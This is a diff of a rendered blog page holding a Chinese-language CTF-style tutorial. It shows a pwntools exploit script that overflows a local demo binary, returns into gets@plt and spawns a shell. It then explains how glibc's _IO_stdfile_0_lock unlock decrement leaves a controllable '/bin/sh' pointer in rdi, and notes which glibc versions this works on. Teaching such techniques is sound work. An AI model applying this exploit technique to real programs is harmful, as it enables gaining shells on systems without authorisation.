+<div class="language-python highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">exp.py</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-7-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-7-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-7-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-7-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-7-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-7-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-7-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-7-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-7-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-7-10">10</a></span>
+<span class="normal"><a href="#__codelineno-7-11">11</a></span>
+<span class="normal"><a href="#__codelineno-7-12">12</a></span>
+<span class="normal"><a href="#__codelineno-7-13">13</a></span>
+<span class="normal"><a href="#__codelineno-7-14">14</a></span>
+<span class="normal"><a href="#__codelineno-7-15">15</a></span>
+<span class="normal"><a href="#__codelineno-7-16">16</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1"></a><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2"></a>
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3"></a><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s2">&quot;debug&quot;</span>
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4"></a><span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./demo&quot;</span><span class="p">)</span>
+</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5"></a><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">()</span>
+</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6"></a>
+</span><span id="__span-7-7"><a id="__codelineno-7-7" name="__codelineno-7-7"></a><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mh">0x20</span>
+</span><span id="__span-7-8"><a id="__codelineno-7-8" name="__codelineno-7-8"></a><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># saved rbp</span>
+</span><span id="__span-7-9"><a id="__codelineno-7-9" name="__codelineno-7-9"></a><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="o">.</span><span class="n">gets</span><span class="p">)</span>  <span class="c1"># ret -&gt; gets@plt</span>
+</span><span id="__span-7-10"><a id="__codelineno-7-10" name="__codelineno-7-10"></a>
+</span><span id="__span-7-11"><a id="__codelineno-7-11" name="__codelineno-7-11"></a><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;ROP me if you can!</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+</span><span id="__span-7-12"><a id="__codelineno-7-12" name="__codelineno-7-12"></a>
+</span><span id="__span-7-13"><a id="__codelineno-7-13" name="__codelineno-7-13"></a><span class="n">pause</span><span class="p">()</span>
+</span><span id="__span-7-14"><a id="__codelineno-7-14" name="__codelineno-7-14"></a><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;/bin&quot;</span> <span class="o">+</span> <span class="n">p8</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="s2">&quot;/&quot;</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&quot;sh&quot;</span><span class="p">)</span>
+</span><span id="__span-7-15"><a id="__codelineno-7-15" name="__codelineno-7-15"></a>
+</span><span id="__span-7-16"><a id="__codelineno-7-16" name="__codelineno-7-16"></a><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></code></pre></div></td></tr></table></div>
+<p>这段脚本里最容易让人困惑的地方就是最后一行输入。为什么不直接发一个 <code>/bin/sh</code>，而要写成这样？</p>
+<p>原因在于 <code>_IO_stdfile_0_lock</code> 并不是普通字符串缓冲区，它前 8 个字节对应的是：</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Text Only</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-8-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1"></a>lock | cnt
+</span></code></pre></div></td></tr></table></div>
 <p>也就是两个 <code>int</code>。第二次 <code>gets</code> 返回之前，glibc 还要顺手执行一次解锁逻辑，而这一步会对 <code>cnt</code> 做一次减一。</p>
 <p>因此如果直接输入 <code>/bin/sh</code>，数据会被这一步破坏掉。</p>
 <p>等到解锁时执行 <code>--cnt</code>，<code>0x30</code> 即 <code>0</code> 就会被减成 <code>0x2f</code>，于是整个 8 字节正好变成：</p>
-<pre><code class="language-text">&quot;/bin/sh\x00&quot;
-</code></pre>
+<div class="language-text highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Text Only</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-9-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1"></a>&quot;/bin/sh\x00&quot;
+</span></code></pre></div></td></tr></table></div>
 <p>这里打个断点，查看寄存器的值：</p>
 <p><img alt="registers" src="../regs.png" /></p>
 <p>到这里就已经足够了，已经可以说明一件非常关键的事：</p>
 <blockquote>
 <p>在没有 <code>pop rdi; ret</code> 的情况下，<code>gets</code> 仍然能够把 <code>rdi</code> 变成一个可控字符串指针。</p>
 </blockquote>
-<h2 id="_2">版本问题</h2>
+<h2 id="_2">版本问题<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
 <p>不过要记住，这并不是一个完全不挑环境的技巧。</p>
 <p>本文讲的这个最小思路，最适合的环境大致是 <code>glibc 2.30</code> 到 <code>2.36</code>。在这些版本里，<code>gets</code> 返回后把 <code>_IO_stdfile_0_lock</code> 留在 <code>rdi</code> 里的行为比较稳定。</p>
 <p>再往前，比如 <code>2.29</code> 以及更早的版本，相关解锁路径的汇编不太一样，<code>_lock</code> 不一定会稳定地留在 <code>rdi</code> 里，最小 demo 往往就跑不通了。</p>
@@ -1978,7 +2216,15 @@ lock | cnt
     
       <script src="../../../../assets/javascripts/bundle.f55a23d4.min.js"></script>
       
-        <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/pangu@4.0.7/dist/browser/pangu.js"></script>
+      
+        <script src="../../../../assets/javascripts/pangu-init.js"></script>
+      
+        <script src="https://cdn.jsdelivr.net/npm/katex@0.16.10/dist/katex.min.js"></script>
+      
+        <script src="https://cdn.jsdelivr.net/npm/katex@0.16.10/dist/contrib/auto-render.min.js"></script>
+      
+        <script src="../../../../assets/javascripts/katex-init.js"></script>
       
         <script src="../../../../assets/document_dates/tippy/popper.min.js"></script>
       
